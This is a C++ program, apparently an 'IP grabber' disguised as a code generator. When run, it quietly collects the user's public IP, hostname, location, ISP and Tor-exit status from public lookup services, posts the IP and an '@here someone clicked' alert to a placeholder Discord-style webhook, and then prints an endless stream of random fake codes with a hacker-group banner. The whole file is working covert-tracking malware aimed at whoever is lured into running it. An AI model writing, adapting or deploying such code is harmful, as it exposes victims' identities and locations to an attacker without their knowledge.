#include <iostream>
#include <fstream>
#include <string>
#include <random>
#include <ctime>
#include <curl/curl.h>
#include <json/json.h>  

using namespace std;


string generarCodigo() {
    string letras = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    string resultado = "";
    random_device rd;
    mt19937 gen(rd());
    uniform_int_distribution<> dis(0, letras.size() - 1);

    for (int i = 0; i < 19; ++i) {
        resultado += letras[dis(gen)];
    }
    return resultado;
}
size_t escribirRespuesta(void* contenido, size_t tamaño, size_t nmemb, void* usuario) {
    ((string*)usuario)->append((char*)contenido, tamaño * nmemb);
    return tamaño * nmemb;
}
void webhookRealizado() {
    CURL* curl;
    CURLcode res;
    string bufferDeLectura;

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, "https://api.ipify.org/?format=json");
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, escribirRespuesta);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &bufferDeLectura);
        res = curl_easy_perform(curl);

        if (res != CURLE_OK) {
            cerr << "curl_easy_perform() falló: " << curl_easy_strerror(res) << endl;
        }
        Json::Reader lector;
        Json::Value objeto;
        lector.parse(bufferDeLectura, objeto);

        string ip = objeto["ip"].asString();
        cout << "IP: " << ip << endl;

        bufferDeLectura.clear();
        curl_easy_setopt(curl, CURLOPT_URL, "https://wtfismyip.com/json");
        res = curl_easy_perform(curl);

        if (res == CURLE_OK) {
            lector.parse(bufferDeLectura, objeto);
            string hostname = objeto["YourFuckingHostname"].asString();
            string ubicacion = objeto["YourFuckingLocation"].asString();
            string isp = objeto["YourFuckingISP"].asString();
            string tor = objeto["YourFuckingTorExit"].asString();
            cout << "Hostname: " << hostname << endl;
            cout << "Ubicación: " << ubicacion << endl;
            cout << "ISP: " << isp << endl;
            cout << "Tor Exit: " << tor << endl;
        }

        string urlWebhook = "TU_URL_DEL_WEBHOOK"; 
        string datosPost = "{\"content\":\"IP Info: " + ip + "\",\"username\":\"IPGrabber\"}";

        curl_easy_setopt(curl, CURLOPT_URL, urlWebhook.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, datosPost.c_str());

        res = curl_easy_perform(curl);

        if (res != CURLE_OK) {
            cerr << "Falló el envío del webhook: " << curl_easy_strerror(res) << endl;
        }

        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
}

void menu() {
    cout << R"(
  (  ) )    )           (( (      )       (    (    (   ) )     
  )\(\( (   () (        ))\))\   ()) (  : )\  (_)  (_) (\(  (   
 ((_))(|)\ (()))\     (((_)((_) (())))\  (_()(_)) (_))  )(| )\  
/ __|()\| |/ _|(_)    |_ _| '_ \/ __|( )((_)() |()| |() ()\(( ) 
\__ \ -_) |  _|_-/     | || .__/ (_ | '_| _` |  _ \  _ \ -_) '_|
|___/___|_|_| /__/    |___|_|   \___|_| \__/_|____/____/___|_|                
By Self$-Was-Here
)" << endl;

    while (true) {
        string codigo = generarCodigo();
        cout << "[InfernumSquad] " << codigo << endl;
    }
}

void notificar() {
    CURL* curl;
    CURLcode res;
    string bufferDeLectura;

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    if (curl) {
        string urlWebhook = "TU_URL_DEL_WEBHOOK"; 
        string datosPost = "{\"content\":\"@here alguien hizo clic\"}";

        curl_easy_setopt(curl, CURLOPT_URL, urlWebhook.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, datosPost.c_str());

        res = curl_easy_perform(curl);

        if (res != CURLE_OK) {
            cerr << "Falló el envío de la notificación: " << curl_easy_strerror(res) << endl;
        }

        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
}

int main() {
    notificar(); 
    webhookRealizado();  
    menu(); 
    return 0;
}
